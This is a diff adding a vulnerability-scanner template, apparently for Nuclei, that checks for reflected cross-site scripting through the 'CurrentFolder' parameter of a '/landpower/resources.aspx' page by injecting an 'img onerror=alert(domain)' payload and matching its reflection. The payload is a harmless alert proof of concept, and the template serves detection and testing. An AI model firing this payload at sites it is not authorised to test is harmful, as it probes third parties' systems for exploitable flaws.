@@ -1,0 +1,20 @@
+id: reflected-xss-via-currentfolder-parameter
+info:
+  name: Reflected XSS via CurrentFolder parameter
+  author: qu1nten
+  severity: high
+  description: The website is vulnerable to reflected cross-site scripting via the `CurrentFolder` parameter.
+  reference: 
+    - https://portswigger.net/web-security/cross-site-scripting
+    - https://hackerone.com/reports/1624267
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain)%3EResources&ID=17263"
+      
+    matchers:
+      - type: word
+        words:
+          - "<img src onerror=alert(domain)>Resources"
+        part: body
